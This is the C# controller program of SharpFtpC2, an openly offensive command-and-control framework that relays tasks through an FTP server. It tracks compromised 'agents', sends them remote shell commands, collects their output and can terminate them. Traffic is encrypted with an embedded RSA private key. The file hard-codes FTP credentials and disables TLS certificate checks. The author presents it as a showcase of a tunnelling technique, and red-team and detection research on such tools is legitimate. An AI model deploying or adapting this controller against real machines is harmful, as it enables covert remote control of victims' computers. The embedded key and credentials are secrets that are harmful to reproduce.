/*
 * =========================================================================================
 * Project:       SharpFtpC2 - C2 (v1.0 Beta)
 * 
 * Description:   SharpFtpShell is a compact C# project that showcases the technique
 *                of tunneling Command and Control (C2) communication via FTP(S).
 * 
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

using FtpAgent;
using FtpC2;
using FtpC2.Responses;
using System.Collections.Concurrent;
using Microsoft.Extensions.CommandLineUtils;
using System.Data;
using FtpC2.Tasks;
using System.Text;
using System.Net;

class Program
{
    // EDIT HERE BEGIN ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    public static readonly string FtpHost = "127.0.0.1";
    public static readonly string FtpUser = "dark";
    public static readonly string FtpPwd = "toor";
    public static readonly bool FtpSecure = false;

    // Ensure that this contains the RSA Private Key for C2, which is used to decrypt data received
    // from the agent. Utilize the RSAKeyHelper Tool to generate a fresh pair of Private and Public keys.
    public static readonly string EncodedPrivateKey = "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";

    // Make sure this includes the RSA Public Key belonging to the remote agent, which is utilized for encrypting
    // data that is sent to the agent's destination.
    public static readonly string EncodedAgentPublicKey = "MIICCgKCAgEAv/20iZMlxpwnmLmhll6ehiFicNgcxiUHlHp68B7lK/cVuFBljrDV4h9mM24uW9J2An726JXUaXJzj6RbNapZV+9NBMOzrlKYGBBd4CngzTGPeji3Uy90gC57x/voDrAd5AFRwqQSXgxNVodWjI9tLF8G36gvtHs69nexRi065CMlbEnqB4zSpiYHboGRkrc953o7sVSb0v39b5xpBu1DUO/gI7XpcdsXvutMcel6+tQPVXRt4AyCuLrM9AQ7Xc2ZrYNk8GL1G/GnFCuHzEvItfUTrzDifl3lqbfUSjfDFazTVmi+bYqSpvNjh5nYtuMxb+dMJ9Us52OMxiArX0ocCSD5Kjwy8aekQmwuArqi/E5W2Gp5LCAln8KztI2UKB5NWtmPmzxX9SkbR9z1St5YZcLuk+ju201HJCAfOpI1T6hSa7Di1FShmvQxKyjOMg7+lytlrtl8K68wvoS/y+ewDXYomP1sbZhh++CCcisM7jvmlgUrIIiLVQf9j5MNSG7fgzO5BkGW+lcqWqRlb9YFqstZ8rMDRefn4iNfpqbXasyNSGTpLsXhRfYVFEJdoLr+AF+DSaU6NmTwA+CmTUQNrwo1fXkscgNRqK6jlaxTdZUiGMolmP187L0Us1iY4g9H8MKQzri0Lk82ZGsB33WhcYXm3LmmIKEBWMBidcN3/xECAwEAAQ==";

    public static readonly int SynchronizeDelay = 1000;
    // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    public static AsymEncryptionHelper? Decryptor;
    public static AsymEncryptionHelper? PeerEncryptor;

    public static CancellationTokenSource CancellationTokenSource = new();

    private static ConcurrentDictionary<Guid /* AgentId */, Agent> Agents = new();
    private static ConcurrentDictionary<Guid /* TaskId */, ResponseWrapper> TaskResponses = new();

    // ConcurrentBag is not suitable in my scenario so I'm using a classic List with locking mechanisms
    private static object TaskRequestsLock = new();
    private static List<TaskWrapper> TaskRequests = new();

    private static Guid ActiveAgent = Guid.Empty;    

    private static void RegisterNewTask(TaskWrapper taskRequest, Guid agentId)
    {
        taskRequest.Id = Guid.NewGuid();
        taskRequest.TaskType = taskRequest.GetType().Name;
        taskRequest.AgentId = agentId;

        lock (TaskRequestsLock)
            TaskRequests.Add(taskRequest);
    }

    private static void RegisterNewCommandTask(TaskCommand.CommandKind command, Guid agentId)
    {
        TaskCommand taskCommand = new();
        taskCommand.Command = command;

        ///
        RegisterNewTask(taskCommand, agentId);
    }

    public static void ShowResult(ResponseWrapper response)
    {
        switch (response)
        {
            case ResponseShellCommand responseShellCommand:
                {
                    UX.ColorBackTicks($"Command: `{responseShellCommand.Command}`");                   

                    if (responseShellCommand.Stdout?.Length > 0)
                        Console.WriteLine(Encoding.UTF8.GetString(responseShellCommand.Stdout)); 

                    if (responseShellCommand.Stderr?.Length > 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;

                        Console.WriteLine(Encoding.UTF8.GetString(responseShellCommand.Stderr));

                        Console.ResetColor();
                    }

                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("EOF");
                    Console.ResetColor();

                    break;
                }

            default:
                {
                    UX.DisplayWarning($"`{response.GetType().Name}` result is not implemented or necessary.");

                    break;
                }
        }
    }

    private static void ControllerPrompt()
    {
        CommandLineApplication parser = new();

        parser.Command("help", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Show available commands.";

            cmd.OnExecute(() =>
            {
                Console.WriteLine(parser.GetHelpText());

                return 0;
            });
        });

        parser.Command("clear", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Clear console.";

            cmd.OnExecute(() =>
            {
                Console.Clear();

                return 0;
            });
        });

        parser.Command("exit", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Exit controller (Donnie Darko).";

            cmd.OnExecute(() =>
            {
                throw new ExitProgramExceptions();

                return 0;
            });
        });

        parser.Command("agents", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Show active agents.";

            cmd.OnExecute(() =>
            {
                if (Agents.Count == 0)
                {
                    UX.DisplayInfo("No agent so far.");

                    return 0;
                }

                DataTable table = new();

                table.Columns.Add("Id");
                table.Columns.Add("User@Computer");
                table.Columns.Add("Domain");
                table.Columns.Add("Process Id");                                
                table.Columns.Add("Is64Bit");

                table.Columns.Add("Last Seen");

                List<KeyValuePair<Guid, Agent>> agentPairs = Agents.ToList();

                agentPairs.Sort((pair2, pair1) => pair1.Value.DateTime.CompareTo(pair2.Value.DateTime));

                foreach (KeyValuePair<Guid, Agent> agentPair in agentPairs)
                {
                    Agent agent = agentPair.Value;
                    ///

                    DataRow row = table.NewRow();

                    row[0] = agentPair.Key;
                    row[1] = agentPair.Value.DisplayName();
                    row[2] = agent.Domain;
                    row[3] = agent.ProcessId;                                        
                    row[4] = agent.Is64BitProcess.ToString();
                    row[5] = (int)(DateTime.Now - agent.DateTime).TotalSeconds;

                    table.Rows.Add(row);
                }

                UX.DisplayTableToConsole(table);

                ///
                return 0;
            });
        });

        parser.Command("use", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Interact with a registered agent.";

            var arg = cmd.Argument("id", "Agent Id");

            cmd.OnExecute(() =>
            {
                if (Guid.TryParse(arg.Value, out Guid agentId))
                {
                    if (Agents.ContainsKey(agentId))
                        ActiveAgent = agentId;                    
                    else
                        throw new IndexOutOfRangeException($"Agent Id(`{agentId}`) not found.");
                }
                else
                    throw new FormatException($"'{arg.Value}' is not a valid GUID.");

                ///
                return 0;
            });
        });

        UX.DisplayControllerPrompt();

        string? action = Console.ReadLine();

        Console.WriteLine();

        if (string.IsNullOrEmpty(action))
            return;

        parser.Execute(action.Split(" "));

        Console.WriteLine();
    }

    private static void AgentPrompt()
    {
        if (ActiveAgent == Guid.Empty)
            return;        

        if (!Agents.TryGetValue(ActiveAgent, out Agent? agent))
        {
            ActiveAgent = Guid.Empty;
            return;
        }

        CommandLineApplication parser = new();

        parser.Command("help", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Show available commands.";

            cmd.OnExecute(() =>
            {
                Console.WriteLine(parser.GetHelpText());

                return 0;
            });
        });

        parser.Command("wait", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");

            var argument = cmd.Option("-s|--seconds", "Seconds to wait", CommandOptionType.SingleValue);

            cmd.Description = "Makes main thread hanging for a defined amount of seconds (default: 1).";

            cmd.OnExecute(() =>
            {
                int seconds = 1;
                if (argument.HasValue())
                {
                    Utilities.CheckIntegerArgument(argument);

                    int.TryParse(argument.Value(), out seconds);
                }

                Thread.Sleep(seconds * 1000);

                ///
                return 0;
            });
        });

        parser.Command("clear", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Clear console.";

            cmd.OnExecute(() =>
            {
                Console.Clear();

                return 0;
            });
        });

        parser.Command("exit", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Exit current agent context.";

            cmd.OnExecute(() =>
            {
                ActiveAgent = Guid.Empty;

                return 0;
            });
        });

        parser.Command("results", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Display remote agent tasks responses.";

            cmd.OnExecute(() =>
            {                
                List<Guid> responses = new();
                foreach(KeyValuePair<Guid, ResponseWrapper> entry in TaskResponses)
                {
                    if (entry.Value.AgentId == ActiveAgent)
                        responses.Add(entry.Key);
                }

                if (responses.Count == 0)
                {
                    UX.DisplayInfo("No result so far.");

                    return 0;
                }

                DataTable table = new();

                table.Columns.Add("#");
                table.Columns.Add("Kind");
                table.Columns.Add("Display Name");
                table.Columns.Add("When");
                
                foreach (KeyValuePair<Guid, ResponseWrapper> entry in 
                    TaskResponses.Where(x => responses.Contains(x.Key)).OrderBy(x => x.Value.DateTime)
                )
                {
                    DataRow row = table.NewRow();

                    row[0] = entry.Key;
                    row[1] = entry.Value.GetType().Name;
                    row[2] = entry.Value.DisplayName();
                    row[3] = Utilities.TimeSince(entry.Value.DateTime);

                    table.Rows.Add(row);
                }
                
                UX.DisplayTableToConsole(table);                

                return 0;                
            });

            parser.Command("results::show", cmd =>
            {
                cmd.HelpOption("-?|-h|--help");
                cmd.Description = "Display a task response content by its id.";

                var arg = cmd.Argument("id", "Task response identifier");

                cmd.OnExecute(() =>
                {
                    if (Guid.TryParse(arg.Value, out Guid responseId))
                    {
                        if (TaskResponses.TryGetValue(responseId, out ResponseWrapper? value))
                            ShowResult(value);
                        else
                            throw new IndexOutOfRangeException($"Response Id(`{responseId}`) not found.");
                    }
                    else
                        throw new FormatException($"'{arg.Value}' is not a valid GUID.");                    

                    ///
                    return 0;
                });
            });

            parser.Command("exec", cmd =>
            {
                cmd.HelpOption("-?|-h|--help");
                cmd.Description = "Run a shell command.";

                var args = cmd.Argument("command", "Shell command", true);

                cmd.OnExecute(() =>
                {
                    if (args.Values.Count == 0)
                        return 1;

                    TaskShellCommand task = new();
                    task.Command = string.Join(" ", args.Values);

                    RegisterNewTask(task, ActiveAgent);

                    return 0;
                });
            });

            parser.Command("kill", cmd =>
            {
                cmd.HelpOption("-?|-h|--help");
                cmd.Description = "Terminate remote agent process.";

                cmd.OnExecute(() =>
                {
                    RegisterNewCommandTask(TaskCommand.CommandKind.TerminateAgent, ActiveAgent);                    

                    return 0;
                });
            });
        });

        UX.DisplayAgentPrompt(agent);

        string? actions = Console.ReadLine();

        Console.WriteLine();

        if (string.IsNullOrEmpty(actions))
            return;

        foreach (string action in Utilities.SplitEx(actions))
            parser.Execute(action.Split(" "));

        Console.WriteLine();
    }

    public static void OnProcessExit(object? sender, EventArgs e)
    {        
        Decryptor?.Dispose();
        PeerEncryptor?.Dispose();
    }

    public static string OnEgressDataModifier(string data)
    {
        if (PeerEncryptor == null || !PeerEncryptor.HasPublicKey())
            return data;

        return PeerEncryptor.EncryptToJson(Encoding.UTF8.GetBytes(data));
    }

    public static string OnIngressDataModifier(string data)
    {
        if (Decryptor == null || !Decryptor.HasPrivateKey())
            return data;

        return Encoding.UTF8.GetString(Decryptor.DecryptFromJson(data));
    }

    public static void Main(string[] args)
    {
        // Important Notice: The delegate below renders the current application susceptible to
        // Man-in-the-Middle (MITM) attacks when utilizing SSL/TLS features.
        // This configuration was implemented to accommodate self-signed certificates.
        // However, it is strongly advised not to employ this approach in a production environment
        // if SSL/TLS security is expected.
        if (FtpSecure)
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ///

        AppDomain.CurrentDomain.ProcessExit += OnProcessExit;

        UX.DisplayBanner();
        ///

        try
        {
            Decryptor = new(null, EncodedPrivateKey);
        }
        catch { 
            Decryptor = null; 
        }

        try
        {
            PeerEncryptor = new(EncodedAgentPublicKey, null);
        }
        catch { 
            PeerEncryptor = null; 
        }

        List<Thread> daemons = new();

        // This thread is tasked with periodically gathering information about active and inactive agents.        
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;            

            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);

            c2Protocol.EgressDataModifier = OnEgressDataModifier;
            c2Protocol.IngressDataModifier = OnIngressDataModifier;

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Refresh Agents Informations
                    c2Protocol.RefreshAgents(Agents);


                    ///
                    Thread.Sleep(SynchronizeDelay);
                }
                catch (Exception ex)
                {
                    UX.DisplayError($"@DaemonProbeThread: {ex.Message}");
                };
            }
        }));


        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);

            c2Protocol.EgressDataModifier = OnEgressDataModifier;
            c2Protocol.IngressDataModifier = OnIngressDataModifier;

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Synchronize Task Responses
                    c2Protocol.EnumerateResponses(TaskResponses);

                    // Register New Task Requests
                    lock (TaskRequestsLock)
                    {
                        foreach (TaskWrapper taskRequest in TaskRequests)
                        {
                            c2Protocol.RegisterNewTask(taskRequest);
                        }
                        TaskRequests.Clear();
                    }
                    
                    ///
                    Thread.Sleep(SynchronizeDelay);
                }
                catch (Exception ex)
                {
                    UX.DisplayError($"@DaemonSynchronizeThread: {ex.Message}");
                };
            }
        }));

        // The action to handle a CTRL+C signal on the console has been registered.
        // When triggered, it will instruct any associated cancellation tokens to properly
        // shut down their associated daemons.
        Console.CancelKeyPress += (sender, cancelEventArgs) =>
        {
            CancellationTokenSource.Cancel(); // Signal tokens that application needs to be closed.

            cancelEventArgs.Cancel = true; // Cancel default behaviour
        };

        // Start daemons
        foreach (Thread daemon in daemons)
            daemon.Start(CancellationTokenSource.Token);

        CancellationToken token = CancellationTokenSource.Token;
        while (!token.IsCancellationRequested)
        {
            try
            {
                if (ActiveAgent == Guid.Empty)
                    ControllerPrompt();
                else
                    AgentPrompt();

                // Dirty method to force messages to process during an IDLE time.
                Thread.Sleep(50);

            }
            catch (ExitProgramExceptions)
            {
                CancellationTokenSource.Cancel();

                break;
            }
            catch (Exception e)
            {
                UX.DisplayError(e.Message);

                Console.WriteLine();
            }
        }

        // Wait for daemons to join main thread
        foreach (Thread daemon in daemons)
            daemon.Join();
    }
}